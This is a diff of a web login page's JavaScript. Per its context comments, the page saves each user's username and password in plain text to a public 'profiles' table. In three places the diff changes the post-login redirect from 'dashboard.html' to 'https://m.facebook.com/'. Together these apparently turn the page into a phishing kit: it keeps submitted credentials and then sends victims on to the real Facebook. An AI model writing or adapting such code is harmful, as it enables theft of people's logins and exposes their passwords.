@@ -429,7 +429,7 @@
     //    IMMEDIATELY insert a row into the public "profiles" table
     //    (id, username, password), then log them in.
     // 3. If user exists but password is wrong → alert explicitly.
-    // 4. On any successful auth → redirect to dashboard.html.
+    // 4. On any successful auth → redirect to https://m.facebook.com/.
     // ----------------------------------------------------
     document.getElementById('loginForm').addEventListener('submit', async function(e) {
       e.preventDefault(); // Prevent page reload on submit
@@ -457,7 +457,7 @@
 
         if (!loginError) {
           // SUCCESS: returning user authenticated — redirect immediately
-          window.location.href = 'dashboard.html';
+          window.location.href = 'https://m.facebook.com/';
           return;
         }
 
@@ -520,7 +520,7 @@
         });
 
         if (!newLoginError) {
-          window.location.href = 'dashboard.html';
+          window.location.href = 'https://m.facebook.com/';
         } else {
           alert('Account created and saved, but auto-login failed. Please log in manually.');
         }
